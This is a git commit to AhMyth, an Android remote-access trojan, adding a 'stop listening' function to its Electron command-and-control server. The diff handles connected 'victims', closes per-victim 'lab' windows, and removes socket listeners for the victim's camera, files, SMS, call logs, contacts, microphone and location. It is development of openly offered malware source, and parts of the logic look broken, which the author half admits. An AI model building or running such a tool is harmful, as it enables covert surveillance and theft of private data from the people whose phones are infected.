a5c404c357a796ca954fbd8977425ef5b13650bf
Morsmalleo <morsmalleodev@gmail.com>
2022-06-17 15:26:04 +0800

    Update Code_Updates.js
    Finally figured out a stop function for the AhMyth listener, this throws an error box with electron when the stop button is clicked for some reason, but aside from that, it allows the server to pause listening for connections on specific ports, if there are any activ connections then on the port that you stop listening on, then the Victims Lab, index of Victim information and the connection itself will be closed Server Side.
    
    This function took me a fucking long time but I am OVER THE MOON that I have managed to get it done :D

--- Dev/Code_Updates.js
+++ Dev/Code_Updates.js
@@ -94,3 +94,116 @@ fs.writeFile(launcherPath, output, 'utf8', (error) => {
             });
 
     }
+    
+// Stop function for the AhMyth Listener | AppCtrl.js = Line 133 --> 165 |
+// ===================================== | ============================= |
+        // when user clicks Listen button
+    $appCtrl.Stop = (port) => {
+      if (!port) {
+          port = CONSTANTS.defaultPort;
+      }
+
+      // notify the main proccess about the port and let him stop listening
+      ipcRenderer.send("SocketIO:Stop", port);
+      $appCtrl.Log("Stopped Listening on port => " + port, CONSTANTS.logStatus.SUCCESS);
+  }
+
+
+  // fired if listening brings error
+  ipcRenderer.on("SocketIO:Stop", (event, error) => {
+      $appCtrl.Log(error, CONSTANTS.logStatus.FAIL);
+          $appCtrl.isListen = false;
+          $appCtrl.$apply()
+  });
+
+
+  // fired when main proccess (main.js) send any new notification about disconnected victim
+  ipcRenderer.on('SocketIO:RemoveVictim', (event, index) => {
+      $appCtrl.Log("Server disconnected " + viclist[index].ip);
+      // delete him from list
+      delete viclist[index];
+      $appCtrl.$apply();
+  });
+
+
+  // notify the main proccess (main.js) to close the lab
+  $appCtrl.closeLab = (index) => {
+      ipcRenderer.send('closeLabWindow', 'lab.html', index);
+    }
+  
+  
+// Stop function for the AhMyth Listener | Main.js = Line 262 --> Line 333 |
+// ===================================== | =============================== |
+ 
+  // fired when stopped listening
+  // It will be fired when AppCtrl emit this event
+  ipcMain.on('SocketIO:Stop', function (event, port) {
+
+  // stop listening
+  IO = IO.close(port);
+  IO.sockets.pingInterval = 10000;
+  IO.sockets.on('connection', function (socket) {
+
+    socket.on('disconnect', function () {
+      // Decrease the socket count on a disconnect
+      victimsList.rmVictim(index);
+
+      //notify renderer proccess (AppCtrl) about the disconnected Victim
+      win.webContents.send('SocketIO:RemoveVictim', index);
+
+      if (windows[index]) {
+        //notify renderer proccess (LabCtrl) if opened about the disconnected Victim
+        BrowserWindow.fromId(windows[index]).webContents.send("SocketIO:ServerDisconnected");
+        //delete the window from windowsList
+        delete windows[index]
+      }
+    });
+
+  });
+
+});
+
+
+//handle the Uncaught Exceptions
+
+
+
+
+// Fired when Victim's Lab is closed
+ipcMain.on('closeLabWindow', function (e, page, index) {
+  //------------------------Lab SCREEN INIT------------------------------------
+  // create the Lab window
+  let child = new BrowserWindow({
+    icon: __dirname + '/app/assets/img/icon.png',
+    parent: win,
+    width: 700,
+    height: 750,
+    show: false,
+    darkTheme: true,
+    transparent: true,
+    resizable: false,
+    frame: false,
+    webPreferences: {
+      nodeIntegration: true,
+      enableRemoteModule: true
+    }
+  })
+
+  child.once('ready-to-show', () => {
+    child.show();
+  });
+
+  child.on('closed', () => {
+    delete windows[index];
+    //on lab window closed remove all socket listners
+    if (victimsList.getVictim(index).socket) {
+      victimsList.getVictim(index).socket.removeAllListeners("x0000ca"); // camera
+      victimsList.getVictim(index).socket.removeAllListeners("x0000fm"); // file manager
+      victimsList.getVictim(index).socket.removeAllListeners("x0000sm"); // sms
+      victimsList.getVictim(index).socket.removeAllListeners("x0000cl"); // call logs
+      victimsList.getVictim(index).socket.removeAllListeners("x0000cn"); // contacts
+      victimsList.getVictim(index).socket.removeAllListeners("x0000mc"); // mic
+      victimsList.getVictim(index).socket.removeAllListeners("x0000lm"); // location
+    }
+  })
+});
